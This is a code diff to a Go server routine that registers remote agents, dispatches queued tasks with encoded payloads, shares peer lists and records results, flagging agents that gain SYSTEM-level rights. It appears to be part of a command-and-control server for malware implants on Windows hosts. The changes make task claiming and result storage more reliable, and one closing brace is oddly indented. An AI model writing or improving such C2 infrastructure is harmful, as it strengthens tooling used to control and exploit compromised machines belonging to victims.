@@ -72,8 +72,8 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 	defer conn.Close()
 	remote := conn.RemoteAddr().String()
 	ip := remote
-	if idx := strings.LastIndex(ip, ":"); idx != -1 {
-		ip = ip[:idx]
+	if host, _, splitErr := net.SplitHostPort(ip); splitErr == nil {
+		ip = host
 	}
 
 	// ── 1. Register (plaintext) ────────────────────────────────────────
@@ -163,16 +163,18 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 				return
 			}
 			s.db.TouchAgent(agentID)
-			tasks, _ := s.db.PendingTasks(agentID)
+			tasks, err := s.db.ClaimPendingTasks(agentID, 32)
+			if err != nil {
+				return
+			}
 
 			var wires []taskWire
 			for _, t := range tasks {
 				tw := taskWire{ID: t.ID, Type: t.Type, Args: t.Args}
 				if len(t.Payload) > 0 {
 					tw.Payload = base64.StdEncoding.EncodeToString(t.Payload)
-				}
+			}
 				wires = append(wires, tw)
-				s.db.MarkTaskFetched(t.ID)
 			}
 			var peers []peerWire
 			for _, p := range s.getMeshPeers(agentID) {
@@ -207,7 +209,9 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 			if err := json.Unmarshal(plain, &res); err != nil {
 				break
 			}
-			s.db.InsertResult(res.TaskID, agentID, res.Output, res.Error)
+			if err := s.db.InsertResult(res.TaskID, agentID, res.Output, res.Error); err != nil {
+				break
+			}
 			if res.IsAdmin {
 				s.db.UpdateAgentAdmin(agentID, true)
 				s.db.UpdateAgentUsername(agentID, "nt authority\\system")
